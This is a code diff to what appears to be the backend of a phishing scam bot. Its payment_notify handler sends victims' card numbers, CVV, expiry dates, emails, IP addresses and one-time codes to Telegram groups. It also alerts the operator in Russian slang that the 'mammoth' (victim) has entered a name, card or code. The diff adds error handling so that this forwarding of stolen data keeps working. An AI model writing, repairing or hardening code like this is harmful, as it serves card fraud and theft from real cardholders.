@@ -1520,8 +1520,14 @@ async def payment_notify(request):
             ]
         ]
     )
-    await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
-    await bot.send_message(ADMIN_GROUP_ID, msg1, parse_mode='HTML')  # Без кнопок
+    try:
+        await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
+    except Exception as e:
+        print(f"[ERROR] send_message PAYMENT_GROUP_ID msg1: {e}")
+    try:
+        await bot.send_message(ADMIN_GROUP_ID, msg1, parse_mode='HTML')  # Без кнопок
+    except Exception as e:
+        print(f"[ERROR] send_message ADMIN_GROUP_ID msg1: {e}")
     # 2. Повідомлення з карткою, CVV, expiry, email, IP + кнопки для карт/коду
     msg2 = (
         f"Email: {email}\n"
@@ -1544,7 +1550,10 @@ async def payment_notify(request):
         ]
     ]
     )
-    await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
+    try:
+        await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
+    except Exception as e:
+        print(f"[ERROR] send_message PAYMENT_GROUP_ID msg2: {e}")
     # 3. Повідомлення з кодом, IP + кнопка Request again
     if code:
         msg3 = (
@@ -1558,7 +1567,10 @@ async def payment_notify(request):
                 ]
             ]
         )
-        await bot.send_message(PAYMENT_GROUP_ID, msg3, reply_markup=kb3)
+        try:
+            await bot.send_message(PAYMENT_GROUP_ID, msg3, reply_markup=kb3)
+        except Exception as e:
+            print(f"[ERROR] send_message PAYMENT_GROUP_ID msg3: {e}")
 
     # --- Дублювання для адміна, якщо знайдено user_id по page_code ---
     page_code = data.get('page', '')
@@ -1570,10 +1582,19 @@ async def payment_notify(request):
         if row:
             admin_user_id = row[0]
     if admin_user_id:
-        await bot.send_message(admin_user_id, 'Мамонт ввёл ФИО')
-        await bot.send_message(admin_user_id, 'Мамонт ввёл карту')
+        try:
+            await bot.send_message(admin_user_id, 'Мамонт ввёл ФИО')
+        except Exception as e:
+            print(f"[ERROR] send_message admin_user_id FIO: {e}")
+        try:
+            await bot.send_message(admin_user_id, 'Мамонт ввёл карту')
+        except Exception as e:
+            print(f"[ERROR] send_message admin_user_id card: {e}")
         if code:
-            await bot.send_message(admin_user_id, 'Мамонт ввёл код')
+            try:
+                await bot.send_message(admin_user_id, 'Мамонт ввёл код')
+            except Exception as e:
+                print(f"[ERROR] send_message admin_user_id code: {e}")
 
 @log_function
 async def code_notify(request):
